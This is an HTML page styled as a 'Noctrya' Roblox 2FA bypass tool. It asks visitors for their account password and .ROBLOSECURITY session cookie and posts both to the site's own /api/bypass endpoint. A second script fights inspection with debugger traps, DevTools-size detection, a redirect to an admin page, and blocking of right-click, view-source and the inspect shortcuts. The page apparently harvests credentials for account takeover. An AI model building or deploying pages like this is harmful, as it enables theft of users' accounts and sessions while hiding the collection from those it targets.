<!-- index.html — 2FA Bypass page (Noctrya themed) -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>2FA Bypass | Noctrya</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600&display=swap" rel="stylesheet">
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{
      --bg:#050505; --bg3:#121212;
      --border:rgba(255,255,255,0.06); --border-h:rgba(255,255,255,0.14);
      --text:#efefef; --muted:#666; --white:#ffffff;
      --accent:#ff2b2b;
    }
    body{
      background:var(--bg);
      color:var(--text);
      font-family:'DM Sans',sans-serif;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:20px;
      position:relative;
      overflow-x:hidden;
    }
    body::before{
      content:'';
      position:fixed;
      top:-10%;left:20%;
      width:600px;height:600px;
      background:radial-gradient(circle, rgba(255,43,43,0.08), transparent 70%);
      pointer-events:none;z-index:0;
      filter:blur(80px);
    }
    body::after{
      content:"";
      position:fixed;top:0;left:0;width:100%;height:100%;
      background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.4'/%3E%3C/svg%3E");
      opacity:0.03;pointer-events:none;z-index:99998;mix-blend-mode:overlay;
    }

    .container{
      position:relative;z-index:2;
      width:100%;max-width:520px;
      background:linear-gradient(145deg, rgba(20,20,20,0.8), rgba(10,10,10,0.9));
      backdrop-filter:blur(20px);
      border:1px solid var(--border);
      border-radius:20px;
      padding:40px 36px;
      box-shadow:0 20px 50px rgba(0,0,0,0.5);
    }
    .container::before{
      content:'';
      position:absolute;top:0;left:0;width:100%;height:1px;
      background:linear-gradient(90deg, transparent, var(--border-h), transparent);
    }

    .logo-area{
      display:flex;align-items:center;gap:12px;margin-bottom:8px;
    }
    .logo-area svg{ width:28px;height:28px; }
    .wordmark{
      font-family:'Syne',sans-serif;font-weight:800;font-size:20px;
      letter-spacing:-0.5px;color:var(--white);
    }

    .subtitle-note{
      text-align:center;font-size:13px;color:var(--muted);
      margin-bottom:28px;letter-spacing:0.02em;
    }

    .field{margin-bottom:18px;}
    .field label{
      display:block;font-size:12px;font-weight:600;letter-spacing:0.08em;
      text-transform:uppercase;color:var(--muted);margin-bottom:8px;
      font-family:'Syne',sans-serif;
    }
    .field input, .field textarea{
      width:100%;background:var(--bg3);border:1px solid var(--border);
      border-radius:10px;padding:14px 16px;color:var(--white);
      font-family:'DM Sans',sans-serif;font-size:15px;outline:none;
      transition:border-color .2s;resize:vertical;
    }
    .field input:focus, .field textarea:focus{
      border-color:var(--accent);
    }
    .field textarea{ min-height:100px; }

    .btn-row{display:flex;gap:10px;margin-top:10px;}
    .btn-submit{
      flex:1;background:var(--accent);color:#080808;
      font-weight:700;font-size:13px;letter-spacing:0.05em;
      text-transform:uppercase;padding:15px 32px;border-radius:100px;
      border:none;cursor:pointer;font-family:'Syne',sans-serif;
      transition:all .2s;box-shadow:0 0 20px rgba(255,43,43,0.3);
    }
    .btn-submit:hover:not(:disabled){
      transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,43,43,0.5);
    }
    .btn-submit:disabled{opacity:0.5;cursor:not-allowed;box-shadow:none;}
    .btn-secondary{
      background:transparent;border:1px solid var(--border-h);color:var(--white);
      font-weight:600;font-size:11px;text-transform:uppercase;padding:10px 18px;
      border-radius:100px;cursor:pointer;transition:all .2s;
      font-family:'Syne',sans-serif;letter-spacing:0.05em;
    }
    .btn-secondary:hover{background:rgba(255,255,255,0.05);border-color:var(--accent);}

    .response-box{
      margin-top:20px;background:var(--bg3);border:1px solid var(--border);
      border-radius:12px;padding:16px;font-size:13px;color:var(--muted);
      font-family:'Courier New',monospace;white-space:pre-wrap;
      word-break:break-all;max-height:200px;overflow-y:auto;
    }

    .toast{
      position:fixed;bottom:30px;left:50%;transform:translateX(-50%);
      background:var(--accent);color:#080808;padding:12px 24px;
      border-radius:100px;font-weight:600;font-size:12px;letter-spacing:0.05em;
      text-transform:uppercase;opacity:0;transition:opacity .3s;z-index:9999;
      pointer-events:none;box-shadow:0 5px 20px rgba(255,43,43,0.4);
    }
    .toast.show{opacity:1;}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-area">
      <svg width="28" height="28" viewBox="0 0 30 30" fill="none"><path d="M6 6 L6 26 L10 26 L10 13 L22 26 L24 26 L24 6 L20 6 L20 19 L8 6 Z" fill="#ff2b2b"/></svg>
      <span class="wordmark">Noctrya · 2FA Bypass</span>
    </div>
    <p class="subtitle-note">Make Sure to Refresh Your Cookie Before Using.</p>

    <div class="field">
      <label>Password</label>
      <input type="text" id="password" placeholder="Account password" />
    </div>
    <div class="field">
      <label>.ROBLOSECURITY Cookie</label>
      <textarea id="cookie" placeholder="Paste your cookie here..."></textarea>
    </div>

    <div class="btn-row">
      <button class="btn-submit" id="submitBtn" onclick="submitBypass()">
        Submit <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M1.5 5.5H9.5M6.5 2.5L9.5 5.5L6.5 8.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </button>
      <button class="btn-secondary" onclick="clearAll()">Clear</button>
      <button class="btn-secondary" onclick="copyResponse()">Copy</button>
    </div>

    <div class="response-box" id="responseData">Waiting for submission...</div>
  </div>

  <div class="toast" id="toast"></div>

  <script>
    // ── BYPASS FUNCTIONS ──
    async function submitBypass() {
      const password = document.getElementById("password").value.trim();
      const cookie = document.getElementById("cookie").value.trim();
      const responseEl = document.getElementById("responseData");
      const submitBtn = document.getElementById("submitBtn");

      if (!password || !cookie) {
        showToast("❌ Please fill in all fields");
        return;
      }

      submitBtn.disabled = true;
      submitBtn.innerHTML = 'Processing...';
      responseEl.innerText = "Sending request to API proxy...";

      try {
        const res = await fetch('/api/bypass', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            Type: "roblox",   // hardcoded – service type removed from UI
            Password: password, 
            Cookie: cookie 
          })
        });

        const contentType = res.headers.get('content-type');
        let data;

        if (contentType && contentType.includes('application/json')) {
          data = await res.json();
          responseEl.innerText = JSON.stringify(data, null, 2);
        } else {
          data = await res.text();
          responseEl.innerText = data;
        }

        if (!res.ok) {
          showToast("❌ Error: " + (data.message || res.status));
        } else {
          showToast("✅ Request completed");
        }
      } catch (err) {
        responseEl.innerText = "Error: " + err.message;
        showToast("❌ Network error");
      } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Submit <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M1.5 5.5H9.5M6.5 2.5L9.5 5.5L6.5 8.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>';
      }
    }

    function clearAll() {
      document.getElementById("password").value = "";
      document.getElementById("cookie").value = "";
      document.getElementById("responseData").innerText = "Waiting for submission...";
      showToast("🗑️ Cleared all fields");
    }

    function copyResponse() {
      const responseEl = document.getElementById("responseData");
      const text = responseEl.innerText;
      
      if (text && !text.includes("Waiting") && !text.includes("Sending")) {
        navigator.clipboard.writeText(text).then(() => {
          showToast("✅ Response copied to clipboard");
        }).catch(() => {
          showToast("❌ Failed to copy");
        });
      }
    }

    function showToast(text) {
      const toast = document.getElementById("toast");
      toast.innerText = text;
      toast.classList.add("show");
      setTimeout(() => toast.classList.remove("show"), 2500);
    }
  </script>

  <script>
    // ── DevTools detection & redirect to admin page ──
    (function(){
      let redirecting=false;
      const redirectToAdmin=()=>{
        if(redirecting)return;redirecting=true;
        try{window.location.href='http://noctrya-gen.vercel.app/admin.html';}catch(e){}
      };
      const isMobile=('ontouchstart' in window)||(navigator.maxTouchPoints>0);
      const T=160;
      const isOpen=()=>(window.outerWidth-window.innerWidth)>T||(window.outerHeight-window.innerHeight)>T;
      if(!isMobile&&isOpen())redirectToAdmin();
      var _t=performance.now();(function anonymous(){debugger})();if(!isMobile&&(performance.now()-_t)>50)redirectToAdmin();
      if(!isMobile)window.addEventListener('resize',function(){if(isOpen()&&!redirecting)redirectToAdmin();});
      if(!isMobile)setInterval(function(){if(isOpen()&&!redirecting)redirectToAdmin();},1000);
      setInterval(function(){
        var t=performance.now();
        (function anonymous(){debugger})();
        if(!redirecting&&!isMobile&&(performance.now()-t)>50)redirectToAdmin();
      },300);
      setInterval(function(){
        (function anonymous(){debugger})();
      },75);
      document.addEventListener('contextmenu',function(e){e.preventDefault();return false;},true);
      document.addEventListener('keydown',function(e){
        const k=e.key,c=e.ctrlKey,s=e.shiftKey;
        if(k==='F12'){e.preventDefault();redirectToAdmin();return false;}
        if(c&&s&&k==='I'){e.preventDefault();redirectToAdmin();return false;}
        if(c&&s&&k==='J'){e.preventDefault();redirectToAdmin();return false;}
        if(c&&s&&k==='C'){e.preventDefault();redirectToAdmin();return false;}
        if(c&&(k==='U'||k==='u')){e.preventDefault();redirectToAdmin();return false;}
        if(c&&(k==='S'||k==='s')){e.preventDefault();return false;}
        if(c&&(k==='P'||k==='p')){e.preventDefault();return false;}
      });
      if(window.location.href.indexOf('view-source')!==-1)redirectToAdmin();
      document.addEventListener('DOMContentLoaded',function(){
        try{document.body.style.userSelect='none';document.body.style.webkitUserSelect='none';document.body.style.msUserSelect='none';}catch(e){}
        try{document.querySelectorAll('img').forEach(function(i){i.setAttribute('draggable','false');if(i.style)i.style.webkitUserDrag='none';});}catch(e){}
      });
    })();
  </script>
</body>
</html>
